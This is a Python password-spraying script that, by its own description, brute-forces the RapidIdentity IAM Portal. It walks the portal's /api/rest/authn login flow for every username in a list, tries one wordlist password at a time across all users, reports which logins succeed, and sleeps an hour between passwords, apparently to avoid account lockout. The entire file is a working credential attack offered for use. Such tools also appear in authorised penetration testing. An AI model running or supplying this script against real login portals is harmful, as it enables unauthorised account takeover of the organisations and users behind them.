import time
import json
import requests
import argparse


def guess_password(host, username, password):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0',
               'Accept': 'application/json, text/javascript, */*; q=0.01',
               'X-Requested-With': 'XMLHttpRequest'
               }
    # Start a session to keep our cookies throughout requests
    session = requests.Session()
    r1 = session.get('https://' + host + '/api/rest/authn', headers=headers)
    result = json.loads(r1.text)
    # Grab the ID value
    id_value = result["id"]
    usernameJSON = {'id': id_value, 'isPasswordRecovery': 'false', 'type': 'username', 'username': username}
    r2 = session.post('https://' + host + '/api/rest/authn', headers=headers, json=usernameJSON)
    passwordJSON = {'type': 'password', 'id': id_value, 'password': password}
    r3 = session.post('https://' + host + '/api/rest/authn', headers=headers, json=passwordJSON)
    result = json.loads(r3.text)
    #  Look for error message
    try:
        error_message = result["error"]["message"]
        return error_message
    # If there is something other than an error message, print full response
    # I don't yet know what a success condition looks like
    except KeyError:
        try:
            if result["type"] == "complete":
                return "Authentication Success!"
        except KeyError:
            return result


parser = argparse.ArgumentParser(description='This is a tool to brute force RapidIdentity IAM Portal')
parser.add_argument('-u', '--users', help='Input file name', required=True)
parser.add_argument('-p', '--passwords', help='Wordlist file name', required=True)
parser.add_argument('-t', '--target', help='target hostname', required=True)

args = parser.parse_args()

userlist = open(args.users, 'r').read().split('\n')
passlist = open(args.passwords, 'r').read().split('\n')

print("Testing " + str(len(userlist)) + " usernames and " + str(len(passlist)) + " passwords.")
for password in passlist:
    print("Spraying: " + password)
    for user in userlist:
        result = guess_password(args.target, user, password)
        print("Tried " + user + ":" + password + " - " + result)
    print("Sleeping 1 hour between each password")
    time.sleep(3600)
